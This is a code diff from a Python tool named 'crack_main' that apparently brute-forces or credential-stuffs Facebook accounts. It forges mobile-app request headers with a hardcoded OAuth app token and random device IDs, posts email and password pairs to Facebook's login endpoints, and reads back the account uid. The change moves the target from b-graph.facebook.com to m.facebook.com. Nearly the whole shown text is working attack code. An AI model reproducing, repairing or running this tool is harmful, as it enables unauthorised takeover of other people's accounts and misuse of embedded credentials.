@@ -394,9 +394,9 @@ class crack_main():
                                 fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                                 adid = str(uuid.uuid4())
                                 abhi = "5531728|62f8ce9"
-                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
+                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'm.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
                                 data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
-                                po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
+                                po = requests.post('https://m.facebook.com/login',headers=head,data=data).json()
                                 #print(po,hdata)ata)
                                 try:
                                         roid = str(po['uid'])
